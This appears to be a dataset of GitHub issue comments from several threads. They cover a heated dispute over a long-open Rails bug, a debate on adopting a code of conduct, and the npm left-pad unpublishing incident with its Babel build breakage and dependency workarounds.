5385	"The problem still exists in `rails 4.1.1` - i can reproduce the problem with example described in #12305.
"
5386	"Thanks. We do have a fix for at https://github.com/rails/rails/pull/15355. I'll link this issue there.
"
5387	"This issue has been automatically marked as stale because it has not been commented on for at least
three months.

The resources of the Rails team are limited, and so we are asking for your help.

If you can still reproduce this error on the `4-1-stable`, `4-0-stable` branches or on `master`,
please reply with all of the information you have about it in order to keep the issue open.

Thank you for all your contributions.
"
5388	"The problem still exists in `rails 4.2.0` - i can reproduce the problem with example described in #12305.
"
5389	"@rafaelfranca Do you realize the bug has been open for 2 years and it's still not fixed? WOW...
"
5390	"@ThomasAlxDmy its OSS, feel free to open a PR with a fix. Comments like that really aren't helpful.

@rafaelfranca @senny since this has been behaviour for all of the 4.x series is it worth reconsidering what intended behaviour should be given 5 is on the horizon? Possibly more people relying on this behaviour now than not. I'm not sure.
"
5391	"@brocktimus Sorry don't want my name associated with rails/AR ;)
"
5392	"Too late. Your entitlement to the free labor of others is now a permanent marker in the annals of Rails. 

> On Jul 28, 2015, at 03:36, ThomasAlxDmy notifications@github.com wrote:
> 
> @brocktimus Sorry don't want my name associated with rails ;)
> 
> —
> Reply to this email directly or view it on GitHub.
"
5393	"@dhh lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;)
"
5394	"Your friend is most welcome to join the community and help device a solution to their issue, if they can do so without your obnoxious entitlement. 

Please do be on your merry way to whatever community you've found that has either no issues or is willing to tolerate your attitude about them. 

> On Jul 28, 2015, at 19:09, ThomasAlxDmy notifications@github.com wrote:
> 
> @dhh lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;)
> 
> —
> Reply to this email directly or view it on GitHub.
"
5395	"@dhh You're over reacting my friend, I'm just pointing out true facts. And that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally) http://www.google.com/trends/explore?hl=en-US#q=%22ruby+on+rails%22,+/m/0bbxf89&cmpt=q&tz&tz and I do believe that is that kind of attitude that leads to it. 

I'm sorry if you can't distinguish your allies from your enemies.   
"
5396	"Your ""true facts"" are as laughable as your claim of ""ally"". Rails is at this point a massive system with an incredibly strong, diligent, and ever-expanding community of users and contributors working on improving it. 

But there will always be bugs, and this particular bug just wasn't important enough to summon any effort to its fix. Ipso facto. 

Rails is not a vendor that owes you, or your friend, anything. It's a common space where everyone can contribute their own fixes and improvements, and in return enjoy that in kind from others.

You contributed nothing but needless scorn and entitlement. That is not the behavior of an ""ally"". Your post-rationalization for this disgraceful behavior is that the truth of a fact like ""bug X has not been fixed for me in duration Y"" completely side-steps the point. That truth is both trivial and obvious. You're not providing any service of revelation by sharing.

The tone in which you chose to, though, was indeed in bad intention. Your clearly meant to, and obviously continue to, belittle the work of thousands of contributors who share their work with all for free. 

And for what? Do you think anyone will be inspired to help your friend deal with this issue with greater haste because you huffed and puffed? Quite the contrary. Demanding the free labor of others with indignation is no way to inspire their charity.

So, again, please pack your entitlement, your banal analysis of the health of Rails, and be gone. Shoo, shoo. 

> On Jul 28, 2015, at 20:21, ThomasAlxDmy notifications@github.com wrote:
> 
> @dhh You're over reacting my friend, I'm just pointing out true facts. and that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally) http://www.google.com/trends/explore?hl=en-US#q=%22ruby+on+rails%22,+/m/0bbxf89&cmpt=q&tz&tz and I do believe that is that kind of attitude that leads to it.
> 
> I'm sorry if you can't distinguish your allies from your enemies.
> 
> —
> Reply to this email directly or view it on GitHub.
"
5397	"Since we are discussing tends, these are interesting number about what you are complaining here http://issuestats.com/github/rails/rails. I think these numbers speak by their self.

Yes, I'm aware that this issue is open for 2 years. In fact I'm aware of all the issues on the issue tracker. But my time is limited, my interest too and I try to focus my time on the things that most interest me, because after all I work here not because someone pays me, but because I love to work with this team and use my free time to help people.

I'm also aware that this is not a trivial issue to fix and it will require a lot of work and it may break a lot of applications like @brocktimus correctly pointed. I know It will be fixed eventually, because there are so many great people working on this framework that it is just matter of time. Every single day someone new starts to contribute to this framework and it is amazing how a little bit of encouragement can create amazing regular contributors like @senny @chancancode @sgrif @kaspth @robin850 @vipulnsward @meinac just to name few.

I really don't know if Rails is dying, but I don't care, because the machinery that runs this framework is more alive than ever.
"
5398	"@brocktimus indeed, this is something that we can just change on Rails 5. The issue is assigned to me, we already have some patches, @sgrif already touched this code too, so I believe we will get it fixed in time to Rails 5.
"
5399	"@dhh Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key.

`Do you realize the bug has been open for 2 years and it's still not fixed?`

IS a true fact, and if you want to laugh about it, feel free but then I really wonder what kind of leader you are for ""Your community"". As you see it was not address against anyone, it was just an open statement. I have not asked for anything, nor I said that you owe me anything. 

Do you think you're going to win that argument by insulting and trolling me? In my humble opinion you should focus on more important thing for ""Your community"" than attacking the ones that want to raise awareness. 

For my friends we found a way around it, so now it would just be helping ""Your community""... Again, I think your attitude is very disappointing far far away from constructive. You should learn that contributing to a project is not the only way to make it move forward (note that I do not claim I ever did), and you should be grateful to all the people that are still trying to make Rails a better word rather than trolling them for your own sake.  
"
5400	"> @dhh Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key.

In my experience that is not what happens. In fact this issue is an outlier, for the reasons that I already explained. So even with awareness the fix is still not trivial and I doubt it will be fixed.
"
5401	"@ThomasAlxDmy I love statistics. Check this out https://www.google.com/trends/explore?hl=en-US#q=rails%2C%20%2Fm%2F0bbxf89&cmpt=q&tz=Etc%2FGMT-3
"
5402	"You left out the `WOW...` part of your quote, dude, which was kind of the finer end of your shitty point
"
5403	"@joemsak stay polite please ;). And Yes WOW to express how surprise I was, did not bring much in the conversation, re-mentioning it felt useless to me (don't feed the trolls). Instead of trolling feel free to leave constructive comment and show that you're a grown man.

To come back to what Rafael said, in my humble opinion having bug is one things, not documenting and letting them hide into the code is another one. 
"
5404	"You've made an excellent point about leaving constructive comments.
"
5405	"If we document a bug it is not a bug anymore but a feature :smile:. Like I said this bug will die, when we think it is time.
"
5406	"😂😂 That's an extreme way of seeing things but why not...
"
5407	"Please leave these wonderful people alone. Myself and many others appreciate their work.
"
5408	"Seriously, this guy has become a troll himself. The issue will be fixed when it's fixed. The Rails core team along with the entire community is constantly working on both features and bugs which amazes me.  Personally, I'm grateful for all of their hard work and sacrifice for the betterment of the framework. 

If people want to bitch and whine about a long standing ""bug"" then perhaps they should quit the rant, write some code, and create a PR.  Last time I checked the core team and contributors are not on some corporate payroll and are not obligated to do anything. They do it for the love of the framework and the community which I think is fabulous. 

Hopefully this thread dies, it's getting way out of hand. 

Myself and thousands others appreciate all you guys do!  
"
5409	"Certainly, this is just one of many issues with AR (the other one which comes to mind being rails/rails#9813 which can be ""solved"" by upgrading, which is not always a practical solution)

I don't even recall the reason why I subscribed to this, but over time I learnt to be more defensive against the very framework itself (especially functionality that is obscure or only used by a minority). 
"
5410	"@rafaelfranca good to hear. Doesn't worry me too much since I just found it when playing with pre release stuff.

@prusswan if ever I'm like ""I wonder what happens when I..."" and I think the behaviour is a bit edge case-y I'll just write a test around the ""broader"" task I'm trying to accomplish. Caught a few bugs in similar cases where I've been relying upon edge cases which have changed during an upgrade.
"
5411	"@sgrif based on your comment in https://github.com/rails/rails/issues/23286#issuecomment-178274217 should this issue also be closed since its currently targeting 5.0?
"
5412	"Not a dread at all. I was going to add this after the next release :+1: 

(this is only because the release is coming soon, and it's a good chance to talk about policy changes for the next version, like modifying support for certain rubies.)
"
5413	"I figured it was something you were thinking about already. Shall we leave this issue open as a space for discussion?
"
5414	"Yup, gonna leave it open until it's actually merged.
"
5415	"Just for an update on this: I am going to cut 1.26.0 tonight or tomorrow, and a CoC will be the first commit of 1.27.0.
"
5416	":rainbow: :fireworks: Thanks @steveklabnik !
"
5417	"@steveklabnik It's possible that, by adopting these restrictive covenants, you may be increasing your organization's litigation risk. I would strongly recommend speaking with a lawyer before adopting something like the Contributor Covenant.
"
5418	"I disagree that having a Code of Conduct opens one up to litigation risks, and I also believe it's an important part of creating a welcoming community.
"
5419	"Just to reiterate @steveklabnik, I encourage you to seek the opinion of an actual legal professional. Matz has been resisting the CC _for a reason_. Also, thank you for your hard work and contributions to the Ruby community.
"
5420	"Fear of legal action was not a stated reason for the rejection of the Contributor Covenant by the Ruby language project. Excuse me if I feel like your stated concern is disingenuous, but it seems like a scare tactic meant to discourage the use of Codes of Conduct.
"
5421	"@jart your concern trolling isn't welcome. You like to suggest that those in favor of a COC aren't programmers who do real work, yet you have never contributed a patch to resuqe. Stop being a hypocrite.
"
5422	"according to https://registry.npmjs.org/left-pad

```
unpublished: {
  name: ""azer"",
  time: ""2016-03-22T21:27:15.696Z"",
  ...
}
```

It's causing Babel to fail installation
"
5423	"@tonytamps thanks for pointing this out

@azer why? this will break babel based builds on travis...
"
5424	"I'm having the same issue.
"
5425	"Yep, I'm having the same problem.
"
5426	"Seems like https://www.npmjs.com/package/left-pad is up again, but no versions published.

![image](https://cloud.githubusercontent.com/assets/95191/13968985/3e6e6842-f080-11e5-8834-4a05ed98b178.png)
"
5427	"@tonytamps it seems like the registry has updated weirdly

```
{
  ""_id"": ""left-pad"",
  ""_rev"": ""12-29db2b53680e1c66ee1acc89502fe1b0"",
  ""name"": ""left-pad"",
  ""time"": {
    ""modified"": ""2016-03-22T21:42:18.002Z"",
    ""created"": ""2014-03-14T09:09:20.762Z"",
    ""0.0.0"": ""2014-03-14T09:09:20.762Z"",
    ""0.0.1"": ""2014-08-14T03:31:03.146Z"",
    ""0.0.2"": ""2014-08-15T07:13:09.056Z"",
    ""0.0.3"": ""2014-08-15T07:14:44.360Z"",
    ""0.0.4"": ""2015-05-20T04:04:04.473Z"",
    ""1.0.0"": ""2016-03-22T21:42:18.002Z"",
    ""unpublished"": {
      ""name"": ""westlac"",
      ""time"": ""2016-03-22T21:47:25.250Z"",
      ""tags"": {
        ""latest"": ""1.0.0""
     },

```
"
5428	"Yeah I published a 1.0.0 to try to resolve the dependency. It looks like someone (not me) completely removed left-pad from the npm registry
"
5429	"Is there a way to get all the old versions back again? In my project it's at the end of a fairly long dependency chain...
"
5430	"@azer would know better why it was unpublished (assuming he was the one to unpublish it)
"
5431	"@camwest The package `line-numbers` is pinned to `0.0.3` specifically, so you'll need to publish that version or someone will have to summon the creator of `line-numbers`.
"
5432	"Just tried replacing the travis version of npm which is fairly old by a the latest and see what it will do

```
npm ERR! Linux 3.13.0-40-generic
npm ERR! argv ""/home/travis/.nvm/versions/node/v4.2.2/bin/node"" ""/home/travis/.nvm/versions/node/v4.2.2/bin/npm"" ""install""
npm ERR! node v4.2.2
npm ERR! npm  v3.8.2
npm ERR! No compatible version found: left-pad@0.0.3
npm ERR! Valid install targets:
npm ERR! 0.0.9
npm ERR! 
npm ERR! 
npm ERR! If you need help, you may report this error at:
npm ERR!     <https://github.com/npm/npm/issues>
npm ERR! Please include the following file with any support request:
npm ERR!     /home/travis/build/coldrye-es/pingo/npm-debug.log
make: *** [deps] Error 1
```

It will now tell me that there is a version 0.0.9... weird.

Will not try to install that one, though, with all the malware going around...
"
5433	"+1 same issue here.
"
5434	"@RongxinZhang try and use the new GitHub reactions instead of the old +1 :)
"
5435	"+1 same issue
"
5436	"@jmcriffey I can't publish 0.0.3 because it's already been published and removed. NPM forbids publishing a version of the same library twice.

See https://github.com/npm/npm-registry-couchapp/issues/148 for context
"
5437	"@lydell is there a way to make line-numbers work again, perhaps an alternate package or by depending on left-pad@1.0.0 instead?
"
5438	"+1... this is messing things up for a lot of ppl.
"
5439	"See https://github.com/lydell/line-numbers/pull/3

This pull request needs to be merged and line-numbers needs to be republished
"
5440	"+1 Also broke my stuff
"
5441	"Same
"
5442	"Same - broke my build
"
5443	"This kind of just broke the internet.
"
5444	"It broked our build. Halp pl0x. Demo video for investors needs deploy soon. :-)
"
5445	"My build wants version 0.0.3 back or else it's going to hold me hostage. npm reports the only valid install target is 0.0.9
"
5446	"was about to deploy after weeks of work (to demonstrate to the client) and bam - this issue. 
"
5447	"https://news.ycombinator.com/item?id=11340319
"
5448	"> It looks like someone (not me) completely removed left-pad from the npm registry

Time to update your password / credentials?
"
5449	"@camwest Ah yeah, I forgot it won't let you republish a version. Seems like you shouldn't be able to delete a version either. The github profile @lydell says they are in Sweden so we might be out of luck until morning there.
"
5450	"@jacksonrayhamilton I'm not the original author. When it was removed from npm I just forked this repo and republished it.
"
5451	"Chatting in https://slack.babeljs.io #discussion fyi
"
5452	"Emergency release of babel with line numbers dependency removed incoming soon...
"
5453	"Yep, given that it's unclear when `line-numbers` will be updated, we're dropping the dependency from `babel-code-frame` for now until we have more time to resolve.
"
5454	"@azer or @camwest please could you re publish this repo.
"
5455	"You can install from github by adding left-pad to your to your `package.json`.

``` json
""dependencies"": {
  ""left-pad"": ""git://github.com/azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355""
}
```
"
5456	"I made a pull request to line-numbers that is using this as a dependency if you guys want to thumb that up so he sees it https://github.com/lydell/line-numbers/pull/2 i believe @camwest made one too
"
5457	"@loganfsmyth care to use lodash? https://lodash.com/docs#padStart
"
5458	"Published a new version of `babel-code-frame` as 6.7.3 that removes `line-numbers`. Need to backport it to v5.
"
5459	"The problem with ""tiny modules"" -- so easy to break the whole NPM ecosystem.
"
5460	"@maxkostow Thanks, 

> adding ""left-pad"": ""git://github.com/azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355"" to your package.json

fixed my build
"
5461	"@loganfsmyth @kittens thank you very much. YMMD!
"
5462	"> The problem with ""tiny modules"" -- so easy to break the whole NPM ecosystem.

NPM should really not allow removing of previously published versions.... surely?
"
5463	"A relevant place to bring up the npm issue is over here: https://github.com/npm/npm/issues/12012
"
5464	"@ctolkien I think that this is also proving that a small issue can be fixed in a matter of minutes with open source when hundreds of people are having an issue. Definitely much better than calling your oracle rep to submit a ticket for an issue.
"
5465	"FYI @isaacs 
"
5466	"FYI Babel 6 is now fixed.

```
$ npm install babel-core@6
/Users/sebmck/Scratch/fuckkk
└─┬ babel-core@6.7.2
  ├─┬ babel-generator@6.7.2
  │ ├─┬ detect-indent@3.0.1
  │ │ ├── get-stdin@4.0.1
  │ │ └── minimist@1.2.0
  │ ├── is-integer@1.0.6
  │ └── trim-right@1.0.1
  ├── babel-helpers@6.6.0
  ├── babel-messages@6.7.2
  ├─┬ babel-register@6.7.2
  │ ├── core-js@2.2.1
  │ ├─┬ home-or-tmp@1.0.0
  │ │ ├── os-tmpdir@1.0.1
  │ │ └── user-home@1.1.1
  │ ├─┬ mkdirp@0.5.1
  │ │ └── minimist@0.0.8
  │ └─┬ source-map-support@0.2.10
  │   └─┬ source-map@0.1.32
  │     └── amdefine@1.0.0
  ├── babel-template@6.7.0
  ├─┬ babel-traverse@6.7.3
  │ ├── globals@8.18.0
  │ └─┬ invariant@2.2.1
  │   └── loose-envify@1.1.0
  ├─┬ babel-types@6.7.2
  │ └── to-fast-properties@1.0.2
  ├── babylon@6.7.0
  ├── convert-source-map@1.2.0
  ├─┬ debug@2.2.0
  │ └── ms@0.7.1
  ├── json5@0.4.0
  ├── lodash@3.10.1
  ├─┬ minimatch@2.0.10
  │ └─┬ brace-expansion@1.1.3
  │   ├── balanced-match@0.3.0
  │   └── concat-map@0.0.1
  ├── path-exists@1.0.0
  ├── path-is-absolute@1.0.0
  ├── private@0.1.6
  ├── shebang-regex@1.0.0
  ├── slash@1.0.0
  └── source-map@0.5.3
```
"
5467	"> The problem with ""tiny modules"" -- so easy to break the whole NPM ecosystem.

The way I see it, the problem is not the modules, but rather reliance on a centralized system.
"
5468	"> A relevant place to bring up the npm issue is over here

No, that is not a relevant place to bring up the issue. This is not something over which the npm CLI maintainers have any control or responsibility. It's unfortunate that this package got unpublished, but this is the system behaving as designed.
"
5469	" a way to vendor npm modules would be sweet
"
5470	"The problem is reliance on other people.

If you rely on other people -- for literally _anything_ -- then you can be surprised when they act in ways that you didn't predict.

That goes for relying on other peoples' servers, their code, their ability to show up to their jobs on time, etc.

The only way to never be surprised or inconvenienced by other people is to not rely on other people for anything.  And none of us are about to do that.

@sheki https://docs.npmjs.com/files/package.json#bundleddependencies

This problem was identified and then fixed in **minutes**.  This isn't an example of the small modules philosophy breaking; it's an example of it _working_.
"
5471	"Wait so what is the fix? Im still getting the error
"
5472	"@anauleau upgrade to babel ^6.7.3 (you may need to clear npm cache locally)
"
5473	"Upgrading babel isn't trivial
"
5474	"@anauleau This is fixed for Babel 6.x, a fix for 5.x is incoming.
"
5475	"I am using babel 5.x, so ill wait...
"
5476	"The fix from @maxkostow worked for me.
"
5477	"> This problem was identified and then fixed in minutes. This isn't an example of the small modules philosophy breaking; it's an example of it working.

@isaacs I completely agree with you, thanks guys!
"
5478	"Hi all, 

Sorry about this. [I've unpublished all my stuff from NPM](https://medium.com/@azerbike/i-ve-just-liberated-my-modules-9045c06be67c#.18dagswv1).

You can change your dependency to point to azer/left-pad. 

If there is any volunteer to take over this module, I'll happily transfer the repo.

Apologizes for inconvenience.

Azer
"
5479	"haha broke my build too. this literally broke major projects like `react-native` :smile:

facebook/react-native#6595

Seems like a lot of major projects have dependencies on this.
"
5480	"@azer yes, please transfer it to me.
"
5481	"@azer my npm username is `sebmck`.
"
5482	"@kittens i would be glad to help too username `ccutch`
"
5483	"wait nope, there's literally no way to fix this for older versions. you've basically broken every single version of babel. you can't republish over already published packages. babel relies on `line-numbers` with a fixed version and `line-numbers` relies on `left-pad` with a fixed version.
"
5484	"> The only way to never be surprised or inconvenienced by other people is to not rely on other people for anything. And none of us are about to do that.

That's not what I was implying. The JavaScript community is library-based; of course we must and do rely on each other for almost everything.

I was implying some decentralization could make the system more reliable. For instance: If a package can't be downloaded, but is cached, install the cached version? (Maybe resolve [this issue](https://github.com/npm/npm/issues/2568)?) Or: Replicate (part of) the registry locally or onto your own server, and refuse to delete packages on your server?
"
5485	"@kittens the repo on npm was complety erased and re uploaded making the 0.0.3 release erased.
"
5486	"@azer I read your article on medium. 
I think what happened is really sad and we should think of some sort of protection against this kind of things happening.
"
5487	"@azer While I'm annoyed this has wasted part of my day. I'm okay for the reasons as you've explained. Now to deal with the fallout.
"
5488	"I changed my pull request for line-numbers which is the dependency that babel uses to use lodash over this library https://github.com/lydell/line-numbers/pull/2 please help get this noticed.
"
5489	"@ccutch that wont fix it since babel relies on it as a fixed version rather than a range
"
5490	"Is there really no way to tell npm to re-publish a package that was explicitly unpublished?
"
5491	"@loganfsmyth there sure is - NPM Inc can step in and steal control of this module just like they did the `kik` module.
"
5492	"Forget my broken build, that's some non-sense!! @azer I totally agree, thank you for your contributions and helping the JS community grow just a little bit more, regardless of this outcome. Cheers buddy!

In my eyes, this is not a waste of time, but a learning experience on dependencies and how open source software is being effected by big companies.
"
5493	"> wait nope, there's literally no way to fix this. you've basically broken every single version of babel. you can't republish over already published packages.

If it's not apparent yet, but this exemplifies how NPM and much of the community's use of it is utterly broken.
"
5494	"The Medium [article](https://medium.com/@azerbike/i-ve-just-liberated-my-modules-9045c06be67c), for those interested.
"
5495	"@tmcgee123

> Forget my broken build, stick it to the man!! @azer I totally agree, thank you for your contributions and helping the JS community grow just a little bit more, regardless of this outcome. Cheers buddy!

yes, who cares about all the peoples time this is wasting am i right
"
5496	"Thanks to @maxkostow - his fix also worked for me. 

```
npm install azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355
```

Add `--save` or `--save-dev` at the end to overwrite your `package.json`.

FYI I was deploying on Codeship but had to clear their depenency cache.
"
5497	"@maxkostow 

> adding ""left-pad"": ""git://github.com/azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355"" to your package.json

Thanks for the fix!
"
5498	"Everyone check out my new npm module called `dominospizza™`
"
5499	"Managed to publish babel 5.8.36.

**IF YOU HAVE YOUR VERSION FIXED THEN YOU WILL NEED TO UPDATE TO ONE OF THE FOLLOWING**:
- `6.7.2`
- `5.8.38`
"
5500	"So ironic that [17 lines](https://github.com/azer/left-pad/blob/master/index.js) of code breaks the internet :raised_hands: 
"
5501	"> So ironic that 17 lines of code breaks the internet :raised_hands:

https://www.youtube.com/watch?v=nT1TVSTkAXg
"
5502	"We've made a copy of 0.0.3 available for anyone who wants to point to it instead: https://github.com/Automattic/left-pad-0.0.3

Here's how we updated our shrinkwrap file to point to it: https://github.com/Automattic/wp-calypso/commit/a6ab6176fc748e5f62bd6fdbd97c19483beab14f
"
5503	"I've requested from npm that they restore 0.0.3 on npm since I'm now the owner of the package...
"
5504	"> npm install azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355 --save

Unfortunately, this does not work behind most corporate firewalls. 
"
5505	"Wow. Many hundreds (thousands by the time it's all done?) of man hours were just wasted because someone doesn't understand basic copyright and trademark law. I'm not a lawyer, but as I understand this NPM and the lawyers did exactly what they were legally required to do.

There's no ""sticking it to the man"" here, this is punishing your fellow node and javascript developers. This is a knee-jerk reaction to a very typical and expected situation (do a Google search for ""kik"") with no thought at all to the consequences.

Also, why do so many NPM modules depend on so many small, easily inlineable helpers and tools?
"
5506	"Thx a ton @maxkostow !!! :+1: You sire are a life-saver!! This works sweet. Installs the so-badly-needed left-pad@0.0.3 version. I am on track now :)

""left-pad"": ""git://github.com/azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355"",
"
5507	"It seems to be working now. Without any hacks or having to manualy install the package.
"
5508	"@paladox I just tried, doesn't work for me.  Did you do an `npm cache clear` before you tried to install?
"
5509	"Someone get kik on the phone, see if they want to take ownership of `left-pad`
"
5510	"@loudwinston nope.
"
5511	"@paladox Do that and try again.  I'm fairly certain its still broken, and will remain so since npm doesn't allow you to republish with the same version number.
"
5512	"@loudwinston if you have a shrinkwrap you need to delete npm_modules, reinstall and regenerate it
"
5513	"@paladox it's not working for me

```
npm install left-pad@0.0.3
npm ERR! Darwin 15.4.0
npm ERR! argv ""node"" ""/usr/local/bin/npm"" ""--registry"" ""https://registry.npmjs.org"" ""install"" ""left-pad@0.0.3""
npm ERR! node v0.12.7
npm ERR! npm  v2.14.8

npm ERR! version not found: left-pad@0.0.3
```
"
5514	"and make sure your babel semver lets you install the latest babel
"
5515	"I can confirm this is fixed
"
5516	"@jasonroelofs Reminds me of DNS - also incompatible with the trademark system.

Namespacing might help avoid this, too. We'd probably still have suits over namespaces, but at least `kik` and `azer` could probably each have their own `kik`.
"
5517	"> Also, why do so many NPM modules depend on so many small, easily inlineable helpers and tools?

@jasonroelofs I dunno, but I got tired of reading changelogs for dozens of semi-maintained deps, so I went back to using Python on the server. Just sayin'
"
5518	"@stavarotti Did you try using `git+https://github.com/azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355` ?  That works for me behind my corp firewall
"
5519	"@diffsky maybe because I did --save. so maybe still broken.
"
5520	"@jasonroelofs  

> Also, why do so many NPM modules depend on so many small, easily inlineable helpers and tools?

not to sound too cynical, but welcome to NPM!

majority of modules are tiny, repeatable simple logic pieces ... it seems as a community we're heavily relying on this pattern.

anyways, not a relevant discussion to this thread, but one I'd like us (as a community) to discus further.
"
5521	"Was broken for my react-native build, is now working with no changes on my part.
"
5522	"https://twitter.com/seldo/status/712414588281552900

**edit** inlined tweets:
_Laurie Voss_
Hey npm users: left-pad 0.0.3 was unpublished, breaking LOTS of builds. To fix, we are un-un-publishing it at the request of the new owner.

_Laurie Voss_
Un-un-publishing is an unprecedented action that we're taking given the severity and widespread nature of breakage, and isn't done lightly.
"
5523	"@jasonroelofs This is how NPM and the JS ecosystem works since 6 years ago
"
5524	"So everyone is clear on what has been updated:

### Babel 5

A new version `babel-core@5.8.38` has been published. If your deps were relying on semver ranges, reinstalling your deps should install the newest version, otherwise you'll need to manually bump your dependency to `5.8.38`.

### Babel 6

The package `babel-code-frame@6.7.3` was released, which is a sub-dependency of `babel-core@6.x`, so re-installing any version of Babel 6 should resolve the issue for you because `babel-core@6.x` has a very broad range for its subdependencies.

Note, if you have an npm cache on your network, you could still have issues so please be sure you're pulling in the updated versions of everything.

That is our recommended solution currently.
"
5525	"@othiym23 pretty sure you _can't_ lock this thread.
"
5526	"Ooops! Wrong issue! @deoxxa, you're right. That was meant for npm/npm#12012, which has now been locked. Sorry to all for the misfire.
"
5527	"@jasonroelofs So true, man. ""I'm dismayed NPM wouldn't break the law for me and thus protect me from myself.""
"
5528	"all y'all are acting super entitled that some guy decided to exercise his legal right to go elsewhere. don't rely on underpaid, overexploited developers for your critical infrastructure maybe? :)
"
5529	"I'd like to request that @othiym23 given abilities to lock any thread on any repo. Thanks for your understanding.
"
5530	"is left-pad 0.0.3 still being restored? doesn't seem to work yet for me.

```
npm ERR! argv ""node"" ""/usr/local/bin/npm"" ""install"" ""left-pad@0.0.3""
npm ERR! node v0.12.7
npm ERR! npm  v2.11.3

npm ERR! version not found: left-pad@0.0.3
npm ERR!
npm ERR! If you need help, you may report this error at:
npm ERR!     <https://github.com/npm/npm/issues>
```
"
5531	"Also as much as it sucks what happened, it's @azer's choice to do what he wants with his modules. Nobody here is entitled to them working forever, nor is he required to keep them on npm. Stop and take a step back before you start scolding him.
"
5532	"@joshmanders Also truth.
"
5533	"While it's @azer's right to unpublish the modules, it is also the ecosystem's right to voice frustrations.
"
5534	"@michaelshobbs My recommendation would be to upgrade your Babel version to the latest of whichever major version you are on.
"
5535	"`npm install azer/left-pad.git#bff80e3ef0db0bfaba7698606c4f623433d14355`  worked for us.

credits to @maxkostow
"
5536	"hrm, unfortunately not using `babel-core`. instead, we're pulling in a bunch of `babel-*` deps.... :(
"
5537	"This just started working for me

```
$ npm --registry https://registry.npmjs.org install left-pad@0.0.3
left-pad@0.0.3 node_modules/left-pad
```
"
5538	"@michaelshobbs You've definitely got `babel-core` in there somewhere :) Feel free to drop by our support channel on [Slack](https://slack.babeljs.io/) if you want more direct help.
"
5539	"Nobody to thank @azer for these few but so heavily used lines of code. Kinda disappointing.
"
5540	"Ah, and it does appear that the re-publish of 0.0.3 has been completed. Hopefully that can be the final fix.

Thank you everyone for bringing the issue to us. On the plus side, it's always nice to hear from ours users :P
"
5541	"> While it's @azer's right to unpublish the modules, it is also the ecosystem's right to voice frustrations.

@ngokevin, rather than voicing frustrations or settling for quick fixes, we should be proposing and implementing long-term solutions, so this doesn't happen again.
"
5542	"@loganfsmyth ah most likely a sub-sub-sub-dep ;P

seems to be working now. thanks!
"
5543	"don't use simple things you could just write yourself.
"
5544	"@pippinlee getting a 404
"
5545	"Confirmed that `npm install left-pad@0.0.3` is now working

![image](https://cloud.githubusercontent.com/assets/992008/13971573/6d116d52-f04e-11e5-8d38-02ba9ce884c9.png)
"
5546	"ZOMG the list of unpublished npm modules WAS UNPUBLISHED!
"
5547	"Prime time for pushing ES2016 usage. https://jsfeatures.in/#ES7-string-prototype-padleft
"
5548	"So apparently npm packages aren't hard to steal:

https://www.npmjs.com/package/kik

:trollface: 
"
5549	"The list is on https://gist.githubusercontent.com/azer/db27417ee84b5f34a6ea/raw/50ab7ef26dbde2d4ea52318a3590af78b2a21162/gistfile1.txt
"
5550	"^ The list of unpublished npm modules was un-un-published ?
"
5551	"@lukebrooker good luck with lawyers!
"
5552	"https://twitter.com/seldo/status/712427318870839296

![image](https://cloud.githubusercontent.com/assets/992008/13971654/1964bc94-f04f-11e5-9dd1-1bdc9234fdec.png)
"
5553	"even if you want your code gone, someone will just put it back, lmao.
"
5554	"> don't use simple things you could just write yourself.

As much fun as it would be to reinvent & retest the entire world, assuming I had no actual work to do, seems that a single incident such as this in the entire history of npm isn't a reason to just throw it all out the window...
"
5555	"If you want to depend on a person's work, be prepared to deal with the consequences of the person's actions over their work.
"
5556	"@jasonroelofs Copyright law is different in every country. Company names are different in every country. I guarantee you, if you've published code, you have published to a package that is already trademarked in a country, somewhere around the world.

Personally, I think this was a very good, very strong message to send to the Open Source community. It is time for copyright reform, and it is time for companies like github, npm, etc to be protected from nonsense like this.

If KIK had an issue, they should be forced to take it up with the original repo owner. At that point, the judge should be forced to understand the impacts of ""unpublishing"" or ""handing over"" a repo.

Even ""RealDonaldTrump"" was forced to pick an alternative name for twitter. You don't see me stomping around because I'm older than that young whippersnapper that just registered my handle on that new social media site - You snooze, you lose.

Kik was a fairly small package, but what would you say if instead, ""react"" or ""angular"" or ""handlebars"" were forced to unpublish their packages, because all of those have different trademarks in different countries.
"
5557	"@kittens FYI

```
➜  left-pad git:(master) npm owner ls left-pad
sebmck <sebmck@gmail.com>
westlac <cameron.westland@autodesk.com>
```
"
5558	"@dolkensp I'm no lawyer, but my understanding is that this is exactly what the ""safe harbour"" part of the DMCA is for.
"
5559	"> NPM should really not allow removing of previously published versions.... surely?

Definitely agree with this. I don't know of any other major package management system that lets you completely delete a package that has been published, other than in very rare scenarios (like a module being backdoored) where it's done manually. Neither NuGet nor Packagist allow deletion of packages, for example.
"
5560	"@jamietre this happens all the time, same with sec issues and bugs, but ultimately you will have to face what @Lana-chan stated. To avoid this you have three ways:
1. Self hosted npm registry
2. Write your own module
3. Clone & link to clone
"
5561	"FYI https://github.com/camwest/left-pad is published now.
"
5562	"> I'm no lawyer, but my understanding is that this is exactly what the ""safe harbour"" part of the DMCA is for.

Nope. ""safe harbour"" is only for the DMCA. ""kik"" package is trademark related, not copyright.
"
5563	"![12807050_10153393328364249_285322252_n](https://cloud.githubusercontent.com/assets/105680/13971933/6a0699ea-f051-11e5-8e12-322083b54db4.gif)
"
5564	"@nijikokun 

> don't use simple things you could just write yourself.

I'll just leave this here. https://en.wikipedia.org/wiki/Unix_philosophy
"
